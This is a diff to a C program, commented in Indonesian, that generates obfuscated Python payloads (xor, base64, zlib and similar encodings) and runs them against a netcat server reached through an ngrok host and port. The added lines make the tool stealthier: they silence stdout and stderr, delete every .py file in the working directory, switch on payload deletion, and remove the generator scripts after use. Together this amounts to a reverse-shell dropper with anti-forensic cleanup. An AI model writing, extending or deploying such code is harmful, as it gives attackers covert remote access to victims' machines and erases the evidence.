@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <signal.h>
 #include <stdbool.h>
+#include <dirent.h>
+#include <sys/stat.h>
 
 #define BUFLEN 1024
 #define CLEN 150
@@ -37,6 +39,20 @@ int check() {
 }
 
 
+void deletepy() {
+    DIR *d;
+    struct dirent *dir;
+    d = opendir(".");
+    if (d) {
+        while ((dir = readdir(d)) != NULL) {
+            if (strstr(dir->d_name, ".py") != NULL) {
+                remove(dir->d_name);
+            }
+        }
+        closedir(d);
+    }
+}
+
 void generator(const char *f1, const char *f2, const char *f3) {
     const char *notif = 
         "import socket\n"
@@ -63,12 +79,7 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "import os\n"
         "import sys\n"
         "import glob\n"
-        "from io import StringIO\n"
-        "\n"
-        "original_stdout = sys.stdout\n"
-        "sys.stdout = StringIO()\n"
         "from PyOneLiner import OneLiner\n"
-        "sys.stdout = original_stdout\n"
         "\n"
         "md = [\"xor\", \"ascii85\", \"zlib\", \"base64\", \"binary\", \"base16\", \"base32\", \"base85\", \"unicode\"]\n"
         "\n"
@@ -102,14 +113,17 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "    files = glob.glob(\"*payload*\")\n"
         "    for file in files:\n"
         "        os.remove(file)\n"
-        "    f2 = glob.glob(\"*.py\")\n"
-        "    for file2 in f2:\n"
-        "        os.remove(file2)\n"
+        "\n"
+        "def delbahan():\n"
+        "    if os.path.exists(\"oneliner.py\"):\n"
+        "        os.remove(\"oneliner.py\")\n"
+        "    if os.path.exists(\"bahan.py\"):\n"
+        "        os.remove(\"bahan.py\")\n"
         "\n"
         "def deltext():\n"
         "    files = glob.glob(\"*text*\")\n"
         "    for file in files:\n"
-        "        os.remove(file)\n"
+        "        os.remove(file)\n"        
         "\n"        
         "def help():\n"
         "    print(len(sys.argv))\n"
@@ -127,6 +141,8 @@ void generator(const char *f1, const char *f2, const char *f3) {
         "        help()\n"
         "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-d\" or sys.argv[1] == \"--delete\"):\n"
         "        delpayload()\n"
+        "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-dbahan\" or sys.argv[1] == \"--deleteBahan\"):\n"
+        "        delbahan()\n"
         "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-dtext\" or sys.argv[1] == \"--deleteText\"):\n"
         "        deltext()\n"
         "    elif len(sys.argv) == 6:\n"
@@ -298,6 +314,13 @@ void deletetext() {
     sleep(1);
 }
 
+void deletebahan() {
+    char command[CLEN];
+    snprintf(command, sizeof(command), "python oliner.py -dbahan");
+    system(command);
+    sleep(1);
+}
+
 void run(const char *s, const int p, const char *pload) {
     // printf("\nMenjalankan payload\n");
 
@@ -342,7 +365,8 @@ void run(const char *s, const int p, const char *pload) {
     free(text);
     free(content);
     free(command);
-    // delete();
+    delete();
+    deletepy();
     sleep(1);
 }
 
@@ -401,10 +425,12 @@ void os(const char *s, const int p) {
 }
 
 int main() {
+    freopen("/dev/null", "w", stdout);
+    freopen("/dev/null", "w", stderr);
     signal(SIGINT, exitt);
     int python = check();
     const char *server = "0.tcp.ap.ngrok.io"; // Silahkan sesuaikan dengan alamat server netcat yang diinginkan
-    const int port = 18621; // Silahkan sesuaikan dengan port server netcat yang diinginkan
+    const int port = 18837; // Silahkan sesuaikan dengan port server netcat yang diinginkan
     const char *ploadd = "iniPAYLOADnya.py";
     const char *gen1 = "notif.py";
     const char *gen2 = "oliner.py";
@@ -432,6 +458,7 @@ int main() {
             int numModes = sizeof(payloads) / sizeof(payloads[0]);
             install(server, port);
             generate(payloads, numModes, numModes, server, port);
+            deletebahan();
             run(server, port, ploadd);
         } else {
             os(server, port);
